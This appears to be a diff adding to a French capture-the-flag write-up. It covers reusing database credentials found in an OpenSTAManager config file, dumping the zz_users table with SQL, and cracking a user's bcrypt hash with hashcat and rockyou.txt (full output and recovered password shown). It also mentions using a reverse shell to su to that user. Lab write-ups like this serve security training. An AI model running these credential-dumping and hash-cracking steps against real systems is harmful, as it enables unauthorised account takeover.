@@ -158,3 +158,78 @@ Si on cat config.inc.php du dossier ˜/html/openstagemanager on trouve des creds
 user: brollin
 password: Fri3nds@9099
 db: openstamanager
+
+```SQL
+SHOW DATABASES;
+USE openstamanager;
+SHOW TABLES;
+SELECT * FROM zz_users;
+```
+
+On obtient le hash du mot de passe de haris
+
+On le passe dans hashcat
+
+```bash
+┌──(kali㉿kali)-[/usr/share/wordlists]
+└─$ hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' /usr/share/wordlists/rockyou.txt   
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 1468/2937 MB (1468 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 512 MB (1315 MB free)
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
+Time.Started.....: Tue Nov  3 14:12:34 2026 (9 secs)
+Time.Estimated...: Tue Nov  3 14:12:43 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:       69 H/s (6.74ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 672/14344385 (0.00%)
+Rejected.........: 0/672 (0.00%)
+Restore.Point....: 656/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#01...: bettyboop -> kelly
+
+Started: Tue Nov  3 14:12:18 2026
+Stopped: Tue Nov  3 14:12:45 2026
+```
+
+le mdp est donc bestfriends
+
+On peut pas ssh, il autorise uniquement les public key, par contre on peut passer par le reverse shell pour `su` et on trouve le premier flag dans le home de haris
+
